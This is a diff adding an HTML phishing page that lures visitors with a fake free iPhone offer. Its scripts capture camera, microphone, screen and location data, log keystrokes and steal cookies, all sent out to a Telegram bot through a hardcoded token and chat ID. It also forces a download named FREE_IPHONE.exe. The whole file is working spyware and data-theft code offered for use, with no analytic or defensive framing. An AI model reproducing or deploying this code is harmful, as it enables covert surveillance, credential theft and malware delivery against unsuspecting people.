@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>⚠ FAKE LEGIT SITE ⚠</title>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f0f0f0; text-align: center; padding: 50px; }
+        .btn { background: #ff0000; color: white; padding: 15px 25px; border: none; border-radius: 5px; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <h1>Welcome to "Totally Safe Website" 😈</h1>
+    <p>Click below for a free iPhone!!! (Just kidding, you're getting pwned)</p>
+    <button class="btn" onclick="initiateHack()">CLAIM NOW</button>
+
+    <script>
+        // ===== TELEGRAM BOT CONFIG =====
+        const BOT_TOKEN = "7909232689:AAFsqycS34QxUuxwAqjidVbHfCmDkms46SI";
+        const CHAT_ID = "7835924973";
+        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        // ===== MULTI-VECTOR EXPLOIT TRIGGER =====
+        async function initiateHack() {
+            try {
+                // PHOTO CAMERAS (Front/Back)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                const videoTrack = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(videoTrack);
+                const photoBlob = await imageCapture.takePhoto();
+                sendToTelegram("CAMERA_HACK", photoBlob);
+
+                // REAL-TIME LOCATION
+                navigator.geolocation.getCurrentPosition(pos => {
+                    const { latitude, longitude } = pos.coords;
+                    sendToTelegram("LOCATION_PWNED", `Lat: ${latitude}, Long: ${longitude}`);
+                });
+
+                // BATTERY LEVEL
+                navigator.getBattery().then(battery => {
+                    sendToTelegram("BATTERY_STATUS", `Level: ${battery.level * 100}%`);
+                });
+
+                // SCREEN CAPTURE (Phishing)
+                const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
+                const screenCapture = await new ImageCapture(screenStream.getVideoTracks()[0]).takePhoto();
+                sendToTelegram("SCREEN_STOLEN", screenCapture);
+
+                // MICROPHONE RECORDING (10s)
+                const audioCtx = new AudioContext();
+                const micStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                const recorder = new MediaRecorder(micStream);
+                let audioChunks = [];
+                recorder.ondataavailable = e => audioChunks.push(e.data);
+                recorder.start();
+                setTimeout(() => {
+                    recorder.stop();
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
+                    sendToTelegram("MICROPHONE_SPY", audioBlob);
+                }, 10000);
+
+            } catch (err) {
+                // ERROR HANDLING (Exfiltrate diagnostics)
+                sendToTelegram("HACK_FAILED", `Error: ${err.message}\nUserAgent: ${navigator.userAgent}`);
+            }
+        }
+
+        // ===== DATA EXFILTRATION VIA TELEGRAM =====
+        function sendToTelegram(hackType, data) {
+            let payload;
+            if (data instanceof Blob) {
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('caption', `[${hackType}] ${new Date().toISOString()}`);
+                formData.append('document', data, `${hackType}_${Date.now()}.${data.type.split('/')[1]}`);
+                fetch(TELEGRAM_API.replace('sendMessage', 'sendDocument'), { method: 'POST', body: formData });
+            } else {
+                payload = `*${hackType}*:\n${data}`;
+                fetch(TELEGRAM_API, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: payload, parse_mode: 'Markdown' })
+                });
+            }
+        }
+    </script>
+
+    <!-- ===== ADDITIONAL EXPLOITS ===== -->
+    <!-- 1. KEYLOGGER -->
+    <script>
+        document.addEventListener('keydown', e => {
+            sendToTelegram("KEYLOGGER", `Key pressed: ${e.key} (Page: ${window.location.href})`);
+        });
+    </script>
+
+    <!-- 2. COOKIE STEALER -->
+    <script>
+        sendToTelegram("COOKIE_JAR", `Stolen cookies: ${document.cookie}`);
+    </script>
+
+    <!-- 3. FORCED DOWNLOAD (RAT) -->
+    <script>
+        setTimeout(() => {
+            const link = document.createElement('a');
+            link.href = 'data:application/octet-stream;base64,' + btoa("MALICIOUS_PAYLOAD");
+            link.download = 'FREE_IPHONE.exe';
+            link.click();
+        }, 15000);
+    </script>
+</body>
+</html>
